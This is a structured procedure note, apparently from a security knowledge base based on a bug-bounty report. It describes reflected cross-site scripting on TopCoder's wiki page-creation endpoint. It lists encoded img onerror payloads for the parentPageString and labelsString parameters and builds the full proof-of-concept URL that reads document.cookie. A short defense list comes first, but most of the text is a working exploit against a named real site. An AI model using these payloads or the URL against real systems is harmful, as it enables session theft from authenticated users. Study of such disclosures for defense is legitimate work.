---
id: proc-002
tags:
  - xss
  - payload-injection
  - url-encoding
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.582Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject XSS Payloads into Parameters

## Summary

This procedure crafts a malicious URL by injecting URL-encoded JavaScript payloads into the parentPageString and labelsString parameters of the TopCoder wiki page creation endpoint, exploiting the lack of input sanitization to enable reflected XSS.

## Description

The vulnerability stems from the reflection of user-supplied values in parentPageString and labelsString without HTML or JavaScript escaping. By appending payloads like "><img src=X onerror=alert(document.cookie)> to these parameters, the attacker creates a PoC URL that, when loaded, injects and executes script in the browser context. This targets authenticated users visiting the link, potentially leading to session theft.

## Requirements

1. Access to the page creation endpoint from the previous procedure
2. Knowledge of URL encoding for payloads
3. Web browser or URL builder tool

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in URL parameters
- Use output encoding for HTML contexts in responses
- Implement web application firewall (WAF) rules to detect XSS patterns

## Objectives

1. Construct encoded payloads for injection
2. Build the full malicious URL
3. Ensure payloads target sensitive data like cookies

## Instructions

### Step 1: Encode the Payloads

**Context**: Convert JavaScript payloads to URL-safe format to avoid breaking the request.

For parentPageString, encode: powerpuff_hackerone"><img src=X onerror=alert(document.cookie)>

Result: powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie)%3E

For labelsString, encode: "><img src=X onerror=alert(document.domain)>

Result: %22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E

> Encoding ensures the payload is transmitted correctly without truncation.

### Step 2: Append to Base URL

**Context**: Combine the base endpoint with parameters and payloads.

Construct: https://apps.topcoder.com/wiki/pages/createpage.action?spaceKey=tcwiki&parentPageString=powerpuff_hackerone%22%3E%3Cimg%20src=X%20onerror=alert(document.cookie)%3E&labelsString=%22%3E%3Cimg+src%3DX+onerror%3Dalert(document.domain)%3E

> The full PoC URL is now ready for testing.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[injection]]
- [[Confluence]]
